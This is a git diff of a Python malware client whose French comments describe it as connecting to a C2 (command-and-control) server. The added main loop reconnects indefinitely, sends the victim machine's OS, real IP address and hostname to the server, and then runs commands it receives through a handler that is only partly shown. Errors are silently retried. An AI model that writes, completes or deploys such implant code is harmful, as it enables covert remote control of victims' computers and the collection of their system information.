@@ -4,6 +4,7 @@ import json
 import struct
 import platform
 import argparse
+import time 
 
 ENCODING ="utf-8"
 RETRY_DELAY = 5
@@ -151,3 +152,33 @@ def handle_command(sock, msg: dict):
             "status": "error",
             "message": str(e)
         })
+
+
+
+def main():
+    while True:  # le client se reco en boucle au C2
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect((SERVER_HOST, SERVER_PORT))
+                
+                # le client envoit les premieres infos
+                send_msg(sock, {
+                    "type": "client connecté",
+                    "os": os_type,
+                    "ip": get_real_ip(),
+                    "hostname": platform.node()
+                })
+
+                # ecoute en boucle des messages envoyés par C2
+                while True:
+                    msg = receiveMessage(sock)
+                    handle_command(sock, msg)
+
+        except (ConnectionError, ConnectionRefusedError, OSError, json.JSONDecodeError):
+            time.sleep(RETRY_DELAY)
+        except Exception:
+            time.sleep(RETRY_DELAY)
+
+
+if __name__ == "__main__":
+    main()
